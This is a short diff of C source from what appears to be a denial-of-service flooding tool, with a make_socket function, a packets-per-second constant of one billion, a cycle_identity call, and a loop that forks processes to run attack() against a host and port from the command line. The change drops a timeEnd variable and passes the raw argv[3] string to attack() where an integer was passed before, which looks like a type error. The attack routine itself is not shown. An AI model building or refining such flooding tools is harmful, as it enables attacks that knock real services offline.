@@ -11,7 +11,7 @@
 #include <arpa/inet.h>
 
 #define PPS 1000000000
-int timeEnd;
+
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
@@ -95,13 +95,13 @@ void cycle_identity() {
 
 int main(int argc, char **argv) {
 	int x;
-	timeEnd = atoi(argv[3]);
+	
 	
 	if(argc !=5)
 		cycle_identity();
 	for(x=0; x != THREADS; x++) {
 		if(fork())
-			attack(argv[1], argv[2], timeEnd, x);
+			attack(argv[1], argv[2], argv[3], x);
 		
 	}
 	getc(stdin);
